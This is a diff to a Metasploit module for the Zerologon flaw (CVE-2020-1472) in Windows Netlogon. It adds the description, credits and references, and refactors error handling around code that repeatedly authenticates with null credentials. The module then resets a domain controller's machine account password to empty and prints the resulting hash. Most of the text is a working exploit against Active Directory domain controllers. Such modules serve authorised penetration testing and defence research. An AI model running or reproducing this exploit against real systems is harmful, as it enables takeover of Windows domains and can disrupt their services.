@@ -14,13 +14,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => '',
+      'Name'           => 'Netlogon Weak Cryptographic Authentication',
       'Description'    => %q{
-
+        A vulnerability exists within the Netlogon authentication process where the security properties granted by AES
+        are lost due to an implementation flaw related to the use of a static initialization vector (IV). An attacker
+        can leverage this flaw to target an Active Directory Domain Controler and make repeated authentication attempts
+        using NULL data fields which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability
+        to reset the machine account password to an empty value, which will then allow the attacker to authenticate as
+        the machine account. After exploitation, it's important to restore this password to it's original value. Failure
+        to do so can result in service instability.
       },
-
       'Author'         => [
-          # todo: add author credits from the references
+        'Tom Tervoort',     # original vulnerability details
+        'Spencer McIntyre', # metasploit module
+        'Dirk-jan Mollema'  # password restoration technique
       ],
       'Notes' => {
         'AKA' => [ 'Zerologon' ]
@@ -32,6 +39,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'DefaultAction'  => 'REMOVE',
       'References'     => [
+        ['CVE', '2020-1472'],
+        ['URL', 'https://www.secura.com/blog/zero-logon'],
         ['URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py'],
         ['URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py']
       ]
@@ -40,22 +49,16 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(0),
-        OptString.new('SERVER_NAME', [ true, 'The server\'s NetBIOS name', '', true ]),
+        OptString.new('NBNAME',   [ true,  'The server\'s NetBIOS name', '' ]),
         OptString.new('PASSWORD', [ false, 'The password to set' ]),
       ])
-
   end
 
   def run
     dport = datastore['RPORT']
     if dport.nil? || dport == 0
       dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')
-
-      unless dport
-        print_error('Could not determine the RPC port used by the Microsoft Netlogon Server')
-        # todo: switch this to a fail_with
-        return
-      end
+      fail_with(Failure::NotFound, 'Could not determine the RPC port used by the Microsoft Netlogon Server') unless dport
     end
 
     # Bind to the service
@@ -81,16 +84,24 @@ class MetasploitModule < Msf::Auxiliary
       break if (status = response.status) == 0
     end
 
-    return unless status == 0
+    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless status == 0
     print_good('Successfully authenticated')
+
+    report_vuln(
+      host: rhost,
+      port: rport,
+      name: name,
+      sname: 'netlogon',
+      proto: 'dcerpc',
+      refs: references,
+      info: "Module #{fullname} successfully authenticated to the server without knowledge of the shared secret"
+    )
 
     response = netr_server_password_set2
     status = response.last(4).unpack('V').first
-    if status == 0
-      print_good("Successfully set the machine account (#{datastore['SERVER_NAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
-    else
-      print_error("Password change failed with NT status: 0x#{status.to_s(16)}")
-    end
+    fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0
+
+    print_good("Successfully set the machine account (#{datastore['NBNAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)")
   end
 
   def action_restore_password
@@ -101,10 +112,7 @@ class MetasploitModule < Msf::Auxiliary
     ppp = encrypt_netlogon_credential(client_challenge, session_key)
 
     response = netr_server_authenticate3(client_credential: ppp)
-    unless response.status == 0
-      print_error('Failed to authenticate')
-      return
-    end
+    fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.status == 0
 
     password = [datastore['PASSWORD']].pack('H*')
 
@@ -116,18 +124,18 @@ class MetasploitModule < Msf::Auxiliary
       ),
       clear_new_password: encrypt_netlogon_credential(new_password_data, session_key)
     )
+    status = response.last(4).unpack('V').first
+    fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0
 
-    if (response.last(4).unpack('V').first) == 0
-      print_good('Successfully set the computer password')
-    end
+    print_good("Successfully set machine account (#{datastore['NBNAME']}$) password")
   end
 
   def netr_server_authenticate3(client_credential: nil)
     nrpc_call('NetrServerAuthenticate3',
-      primary_name: "\\\\#{datastore['SERVER_NAME']}",
-      account_name: "#{datastore['SERVER_NAME']}$",
+      primary_name: "\\\\#{datastore['NBNAME']}",
+      account_name: "#{datastore['NBNAME']}$",
       secure_channel_type: 6, # SERVER_SECURE_CHANNEL
-      computer_name: datastore['SERVER_NAME'],
+      computer_name: datastore['NBNAME'],
       client_credential: client_credential,
       flags: 0x212fffff
     )
@@ -136,20 +144,20 @@ class MetasploitModule < Msf::Auxiliary
   def netr_server_password_set2(authenticator: nil, clear_new_password: nil)
     authenticator ||= Netlogon::NetlogonAuthenticator.new
     request = NetrServerPasswordSet2Request.new(
-      primary_name: "\\\\#{datastore['SERVER_NAME']}",
-      account_name: "#{datastore['SERVER_NAME']}$",
+      primary_name: "\\\\#{datastore['NBNAME']}",
+      account_name: "#{datastore['NBNAME']}$",
       secure_channel_type: 6, # SERVER_SECURE_CHANNEL
-      computer_name: datastore['SERVER_NAME'],
+      computer_name: datastore['NBNAME'],
       authenticator: authenticator,
       clear_new_password: clear_new_password
     )
     dcerpc.call(request.opnum, request.to_binary_s)
   end
 
-  def netr_server_req_challenge(client_challenge: "\x00" * 8)
+  def netr_server_req_challenge(client_challenge: nil)
     nrpc_call('NetrServerReqChallenge',
-      primary_name: "\\\\#{datastore['SERVER_NAME']}",
-      computer_name: datastore['SERVER_NAME'],
+      primary_name: "\\\\#{datastore['NBNAME']}",
+      computer_name: datastore['NBNAME'],
       client_challenge: client_challenge
     )
   end
